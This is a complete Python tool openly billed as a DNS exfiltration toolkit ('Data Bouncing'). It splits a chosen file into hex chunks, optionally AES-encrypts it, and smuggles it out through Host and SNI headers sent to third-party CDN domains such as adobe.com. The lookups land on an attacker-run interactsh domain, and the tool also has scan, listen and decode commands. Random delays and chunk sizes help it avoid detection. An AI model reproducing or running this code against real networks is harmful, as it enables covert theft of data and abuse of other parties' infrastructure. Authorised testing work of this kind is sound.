#!/usr/bin/env python3
"""
Data Bouncing - All-in-one tool.

Commands:
  send     Exfiltrate a file via DNS bounce
  scan     Mass test which domains/methods work
  decode   Reconstruct data from interactsh logs
  listen   Start interactsh-client and log to file
"""

import argparse
import hashlib
import os
import random
import re
import socket
import ssl
import subprocess
import sys
import time
from datetime import datetime

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.padding import PKCS7


# --- Shared ---

def log(msg: str):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] {msg}")


def resolve(host: str) -> str | None:
    try:
        return socket.getaddrinfo(host, 80)[0][4][0]
    except socket.gaierror:
        return None


# --- Crypto ---

def encrypt_data(data: bytes, key: str) -> bytes:
    key_bytes = hashlib.md5(key.encode()).digest()
    iv = os.urandom(16)
    padder = PKCS7(128).padder()
    padded = padder.update(data) + padder.finalize()
    enc = Cipher(algorithms.AES(key_bytes), modes.CBC(iv)).encryptor()
    return iv + enc.update(padded) + enc.finalize()


def decrypt_data(data: bytes, key: str) -> bytes:
    key_bytes = hashlib.md5(key.encode()).digest()
    iv, ct = data[:16], data[16:]
    dec = Cipher(algorithms.AES(key_bytes), modes.CBC(iv)).decryptor()
    padded = dec.update(ct) + dec.finalize()
    unpadder = PKCS7(128).unpadder()
    return unpadder.update(padded) + unpadder.finalize()


# --- Bounce methods ---

def bounce_raw(ip: str, domain: str):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    try:
        sock.connect((ip, 80))
        sock.sendall(f"GET / HTTP/1.1\r\nHost: {domain}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n".encode())
        sock.recv(4096)
    except Exception:
        pass
    finally:
        sock.close()


def bounce_sni(ip: str, domain: str):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        sock.connect((ip, 443))
        tls = ctx.wrap_socket(sock, server_hostname=domain)
        tls.sendall(f"GET / HTTP/1.1\r\nHost: {domain}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n".encode())
        tls.recv(4096)
    except Exception:
        pass
    finally:
        sock.close()


def bounce_host(url: str, domain: str):
    import requests
    try:
        requests.get(f"http://{url}", headers={"Host": domain}, timeout=5)
    except Exception:
        pass


METHODS = {
    "raw": lambda ip, url, dom: bounce_raw(ip, dom),
    "sni": lambda ip, url, dom: bounce_sni(ip, dom),
    "host": lambda ip, url, dom: bounce_host(url, dom),
}


# --- Commands ---

def cmd_send(args):
    """Exfiltrate a file."""
    log(f"Reading {args.file}")
    with open(args.file, "rb") as f:
        data = f.read()
    log(f"{len(data)} bytes")

    if args.key:
        log("Encrypting...")
        data = encrypt_data(data, args.key)

    # Chunk
    chunks, idx = [], 0
    while idx < len(data):
        sz = random.randint(14, 18)
        if idx + sz > len(data):
            sz = len(data) - idx
        chunks.append(data[idx:idx + sz].hex().upper())
        idx += sz

    urls = list(args.urls) if args.urls else []
    if args.url_file:
        with open(args.url_file) as uf:
            urls += [l.strip() for l in uf if l.strip() and not l.startswith("#")]

    log(f"{len(chunks)} chunks -> bouncing off {', '.join(urls)}")

    # Resolve targets
    targets = {}
    for u in urls:
        ip = resolve(u)
        if ip:
            targets[u] = ip
        else:
            log(f"  SKIP {u} (resolve failed)")

    if not targets:
        log("No valid targets!")
        return

    method_fn = METHODS.get(args.method)
    method_list = list(METHODS.values()) if args.method == "all" else [method_fn]

    for i, chunk in enumerate(chunks):
        order = f"{i + 1:03d}"
        url = random.choice(list(targets.keys()))
        ip = targets[url]
        full = f"{args.id}.{order}.{chunk}.{args.domain}"

        print(f"  [{order}/{len(chunks):03d}] {url} ", end="", flush=True)
        for fn in method_list:
            fn(ip, url, full)
        print("OK")

        if i < len(chunks) - 1:
            time.sleep(random.uniform(0.5, 2.0))

    log("Done! Check interactsh for hits.")


def cmd_scan(args):
    """Mass test domains."""
    domains = list(args.urls) if args.urls else []
    if args.file:
        with open(args.file) as f:
            domains += [l.strip() for l in f if l.strip() and not l.startswith("#")]

    if not domains:
        log("No domains to test!")
        return

    methods = args.methods if args.methods else ["raw", "sni", "host"]
    payload = "DEADBEEF01020304"

    log(f"Testing {len(domains)} domains x {len(methods)} methods")
    print()
    print(f"  {'DOMAIN':<35} {'METHOD':<8} {'IP':<18} {'TAG'}")
    print(f"  {'-'*35} {'-'*8} {'-'*18} {'-'*20}")

    results = []
    for d in domains:
        ip = resolve(d)
        if not ip:
            print(f"  {d:<35} {'--':<8} {'RESOLVE FAIL':<18}")
            continue
        for m in methods:
            tag = f"{m}-{hashlib.md5(f'{d}:{m}'.encode()).hexdigest()[:6]}"
            full = f"{tag}.001.{payload}.{args.domain}"
            METHODS[m](ip, d, full)
            print(f"  {d:<35} {m:<8} {ip:<18} {tag}")
            results.append({"domain": d, "method": m, "tag": tag, "ip": ip})
            time.sleep(args.delay)

    print()
    log("Done! Check interactsh for which tags got hits.")
    print()
    print("  Tag reference:")
    for r in results:
        print(f"    {r['tag']:<20} = {r['domain']} ({r['method']})")

    # Write results to file
    out_file = args.output or "scan_results.txt"
    with open(out_file, "w") as f:
        f.write(f"# Data Bouncing Scan Results - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"# OOB Domain: {args.domain}\n\n")
        f.write(f"{'DOMAIN':<35} {'METHOD':<8} {'IP':<18} {'TAG'}\n")
        f.write(f"{'-'*35} {'-'*8} {'-'*18} {'-'*20}\n")
        for r in results:
            f.write(f"{r['domain']:<35} {r['method']:<8} {r['ip']:<18} {r['tag']}\n")
    log(f"Results written to {out_file}")


def cmd_decode(args):
    """Decode interactsh logs."""
    if args.log_file == "-":
        content = sys.stdin.read()
    else:
        log(f"Reading {args.log_file}")
        with open(args.log_file) as f:
            content = f.read()

    # Auto-detect identifiers
    if args.id:
        ids = [args.id]
    else:
        pattern = r"(?:^|\[|\s)([a-zA-Z][a-zA-Z0-9_-]*)\.(\d{3})\.([0-9A-Fa-f]{4,})\."
        matches = re.findall(pattern, content)
        skip = {"proxy-host", "host", "hello"}
        ids = sorted(set(m[0] for m in matches if m[0] not in skip))
        if not ids:
            log("No identifiers found.")
            return
        log(f"Found {len(ids)} session(s): {', '.join(ids)}")

    os.makedirs(args.output, exist_ok=True)

    for ident in ids:
        pat = rf"(?:^|\[|\s|\.){re.escape(ident)}\.(\d{{3}})\.([0-9A-Fa-f]+)"
        matches = re.findall(pat, content)
        if not matches:
            continue

        seen = {}
        for seq, chunk in matches:
            order = int(seq)
            if order not in seen:
                seen[order] = chunk

        sorted_chunks = sorted(seen.items())
        data = bytearray()
        for _, chunk in sorted_chunks:
            data.extend(bytes.fromhex(chunk))

        if args.key:
            ct_len = len(data) - 16
            remainder = ct_len % 16
            if remainder:
                data = data[:len(data) - remainder]
            try:
                data = decrypt_data(bytes(data), args.key)
            except Exception as e:
                log(f"[{ident}] Decrypt failed: {e}")
                continue

        # Print
        print(f"\n{'='*60}")
        print(f"  {ident}  ({len(sorted_chunks)} chunks, {len(data)} bytes)")
        print(f"{'='*60}")
        try:
            text = data.decode("utf-8", errors="replace")
            for line in text.splitlines():
                print(f"  {line}")
        except Exception:
            print("  <binary data>")

        # Write
        out = os.path.join(args.output, f"{ident}.txt")
        with open(out, "wb") as f:
            f.write(bytes(data))
        print(f"  -> {out}")

    print()
    log(f"Files written to {args.output}/")


def cmd_listen(args):
    """Start interactsh-client, log to file and screen."""
    log_file = args.output or "interactsh.log"
    log(f"Starting interactsh-client -> {log_file}")
    log("Press Ctrl+C to stop\n")
    try:
        proc = subprocess.Popen(
            ["interactsh-client"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
        with open(log_file, "w") as f:
            for line in proc.stdout:
                sys.stdout.write(line)
                sys.stdout.flush()
                f.write(line)
                f.flush()
    except KeyboardInterrupt:
        proc.terminate()
        log(f"\nStopped. Logs saved to {log_file}")
    except FileNotFoundError:
        log("interactsh-client not found! Install: go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest")


def main():
    parser = argparse.ArgumentParser(
        description="Data Bouncing - DNS exfiltration toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Quick start:
  1. Start listener:   %(prog)s listen
  2. Copy the .oast.fun domain
  3. Send a file:      %(prog)s send -d DOMAIN -u adobe.com -f secret.txt -i mysession
  4. Decode:           %(prog)s decode -l interactsh.log

Scan CDNs:             %(prog)s scan -d DOMAIN -u adobe.com fedex.com ups.com
        """,
    )
    sub = parser.add_subparsers(dest="command", required=True)

    # send
    p = sub.add_parser("send", help="Exfiltrate a file via DNS bounce")
    p.add_argument("-d", "--domain", required=True, help="Your interactsh/OOB domain")
    p.add_argument("-u", "--urls", nargs="+", help="Akamai-backed domains to bounce off")
    p.add_argument("-F", "--url-file", help="File with domains to bounce off (one per line)")
    p.add_argument("-f", "--file", required=True, help="File to exfiltrate")
    p.add_argument("-i", "--id", default="data", help="Session identifier (default: data)")
    p.add_argument("-m", "--method", choices=["raw", "sni", "host", "all"], default="raw", help="Bounce method (default: raw)")
    p.add_argument("-k", "--key", default="", help="AES encryption key (omit for no encryption)")

    # scan
    p = sub.add_parser("scan", help="Mass test which domains bounce")
    p.add_argument("-d", "--domain", required=True, help="Your interactsh/OOB domain")
    p.add_argument("-u", "--urls", nargs="+", help="Domains to test")
    p.add_argument("-F", "--file", help="File with domains (one per line)")
    p.add_argument("-m", "--methods", nargs="+", choices=["raw", "sni", "host"], help="Methods to test (default: all)")
    p.add_argument("--delay", type=float, default=1.0, help="Delay between tests (default: 1s)")
    p.add_argument("-o", "--output", help="Write results to file (default: scan_results.txt)")

    # decode
    p = sub.add_parser("decode", help="Reconstruct data from DNS logs")
    p.add_argument("-l", "--log-file", required=True, help="Interactsh log file (or - for stdin)")
    p.add_argument("-i", "--id", help="Specific identifier (default: auto-detect all)")
    p.add_argument("-o", "--output", default="./output", help="Output directory (default: ./output)")
    p.add_argument("-k", "--key", default="", help="AES decryption key")

    # listen
    p = sub.add_parser("listen", help="Start interactsh-client and save logs")
    p.add_argument("-o", "--output", help="Log file path (default: interactsh.log)")

    args = parser.parse_args()
    {"send": cmd_send, "scan": cmd_scan, "decode": cmd_decode, "listen": cmd_listen}[args.command](args)


if __name__ == "__main__":
    main()
